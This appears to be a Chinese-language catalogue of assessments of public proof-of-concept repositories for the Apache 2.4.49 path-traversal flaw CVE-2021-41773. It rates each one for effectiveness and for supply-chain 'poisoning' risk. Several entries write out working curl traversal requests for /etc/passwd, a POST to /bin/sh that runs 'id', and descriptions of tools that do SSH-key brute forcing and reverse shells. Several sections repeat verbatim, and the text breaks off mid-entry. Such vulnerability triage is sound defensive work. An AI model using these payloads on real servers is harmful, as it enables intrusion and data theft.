CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且配置允许CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。这是一个路径遍历漏洞，攻击者可以利用该漏洞读取服务器上的任意文件，甚至执行任意命令。根据漏洞信息和搜索结果，该漏洞在野外已被积极利用。提供的 POC 代码 `CVE-2021-41773.py` 利用了URL路径遍历漏洞，允许攻击者通过构造特殊的URL访问受限目录之外的文件。如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历绕过访问控制，执行任意代码。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e` (或等效的 URL 编码) 的 URL，以绕过 Apache 的路径规范化安全检查，从而访问位于 Alias 指令配置目录之外的文件。
2.  **CGI 执行：** 如果目标服务器的配置允许在被 Alias 指令映射的路径上执行 CGI 脚本，则攻击者可以通过 POST 请求将 shell 命令传递给 CGI 脚本来执行任意代码。攻击者发送包含命令的 POST 请求到构造的URL，例如 `http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh`，并在 POST 数据中包含要执行的命令。

**投毒风险：**

代码分析显示，POC脚本主要用于利用漏洞，没有发现任何明显的恶意或隐藏的投毒代码。脚本的功能是利用路径遍历漏洞执行命令，其行为与漏洞利用预期一致。因此，投毒风险评估为 0%。该脚本依赖于目标服务器配置，成功利用需要目标服务器存在漏洞，并开启 CGI 支持。

**项目地址:** [redspy-sec/CVE-2021-41773](https://github.com/redspy-sec/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

